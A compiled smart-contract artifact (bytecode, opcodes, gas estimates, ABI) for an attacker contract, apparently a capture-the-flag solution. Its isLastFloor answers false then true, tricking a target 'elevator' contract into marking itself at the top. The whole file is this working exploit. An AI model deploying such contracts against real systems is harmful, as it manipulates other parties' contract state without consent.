{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60a06040526000805534801561001457600080fd5b5060405161058b38038061058b83398181016040528101906100369190610088565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1660601b81525050506100fa565b600081519050610082816100e3565b92915050565b60006020828403121561009a57600080fd5b60006100a884828501610073565b91505092915050565b60006100bc826100c3565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6100ec816100b1565b81146100f757600080fd5b50565b60805160601c61046d61011e6000396000818160ab015261013b015261046d6000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80635f9a4bca1461003b5780639e5faafc1461006b575b600080fd5b6100556004803603810190610050919061026e565b610075565b60405161006291906102f5565b60405180910390f35b6100736100a9565b005b600080600054141561009f576001600054610090919061035c565b600081905550600090506100a4565b600190505b919050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663ed9a713460016040518263ffffffff1660e01b81526004016101039190610310565b600060405180830381600087803b15801561011d57600080fd5b505af1158015610131573d6000803e3d6000fd5b50505050600115157f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663fe6dcdba6040518163ffffffff1660e01b815260040160206040518083038186803b15801561019f57600080fd5b505afa1580156101b3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101d79190610245565b151514610219576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102109061032b565b60405180910390fd5b565b60008151905061022a81610409565b92915050565b60008135905061023f81610420565b92915050565b60006020828403121561025757600080fd5b60006102658482850161021b565b91505092915050565b60006020828403121561028057600080fd5b600061028e84828501610230565b91505092915050565b6102a0816103b2565b82525050565b6102af816103c8565b82525050565b60006102c260048361034b565b91507f6661696c000000000000000000000000000000000000000000000000000000006000830152602082019050919050565b600060208201905061030a6000830184610297565b92915050565b600060208201905061032560008301846102a6565b92915050565b60006020820190508181036000830152610344816102b5565b9050919050565b600082825260208201905092915050565b6000610367826103be565b9150610372836103be565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156103a7576103a66103da565b5b828201905092915050565b60008115159050919050565b6000819050919050565b60006103d3826103be565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b610412816103b2565b811461041d57600080fd5b50565b610429816103be565b811461043457600080fd5b5056fea2646970667358221220b22f6a549ab6e12f2f6f41d95d1f7fa317406f8c4df35543ddce0d31f9e48f4f64736f6c63430008000033",
			"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x14 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x58B CODESIZE SUB DUP1 PUSH2 0x58B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x36 SWAP2 SWAP1 PUSH2 0x88 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE POP POP POP PUSH2 0xFA JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x82 DUP2 PUSH2 0xE3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x9A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xA8 DUP5 DUP3 DUP6 ADD PUSH2 0x73 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xBC DUP3 PUSH2 0xC3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xEC DUP2 PUSH2 0xB1 JUMP JUMPDEST DUP2 EQ PUSH2 0xF7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH1 0x60 SHR PUSH2 0x46D PUSH2 0x11E PUSH1 0x0 CODECOPY PUSH1 0x0 DUP2 DUP2 PUSH1 0xAB ADD MSTORE PUSH2 0x13B ADD MSTORE PUSH2 0x46D PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5F9A4BCA EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x26E JUMP JUMPDEST PUSH2 0x75 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x2F5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0xA9 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SLOAD EQ ISZERO PUSH2 0x9F JUMPI PUSH1 0x1 PUSH1 0x0 SLOAD PUSH2 0x90 SWAP2 SWAP1 PUSH2 0x35C JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP1 POP PUSH2 0xA4 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xED9A7134 PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x103 SWAP2 SWAP1 PUSH2 0x310 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x131 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x1 ISZERO ISZERO PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFE6DCDBA PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1B3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1D7 SWAP2 SWAP1 PUSH2 0x245 JUMP JUMPDEST ISZERO ISZERO EQ PUSH2 0x219 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x210 SWAP1 PUSH2 0x32B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x22A DUP2 PUSH2 0x409 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x23F DUP2 PUSH2 0x420 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x257 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x265 DUP5 DUP3 DUP6 ADD PUSH2 0x21B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x280 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x28E DUP5 DUP3 DUP6 ADD PUSH2 0x230 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2A0 DUP2 PUSH2 0x3B2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x2AF DUP2 PUSH2 0x3C8 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2C2 PUSH1 0x4 DUP4 PUSH2 0x34B JUMP JUMPDEST SWAP2 POP PUSH32 0x6661696C00000000000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP4 ADD MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x30A PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x297 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x325 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2A6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x344 DUP2 PUSH2 0x2B5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x367 DUP3 PUSH2 0x3BE JUMP JUMPDEST SWAP2 POP PUSH2 0x372 DUP4 PUSH2 0x3BE JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x3A7 JUMPI PUSH2 0x3A6 PUSH2 0x3DA JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3D3 DUP3 PUSH2 0x3BE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x412 DUP2 PUSH2 0x3B2 JUMP JUMPDEST DUP2 EQ PUSH2 0x41D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x429 DUP2 PUSH2 0x3BE JUMP JUMPDEST DUP2 EQ PUSH2 0x434 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB2 0x2F PUSH11 0x549AB6E12F2F6F41D95D1F PUSH32 0xA317406F8C4DF35543DDCE0D31F9E48F4F64736F6C6343000800003300000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "226600",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"attack()": "infinite",
				"isLastFloor(uint256)": "infinite"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc",
			"isLastFloor(uint256)": "5f9a4bca"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "ele",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"name": "isLastFloor",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}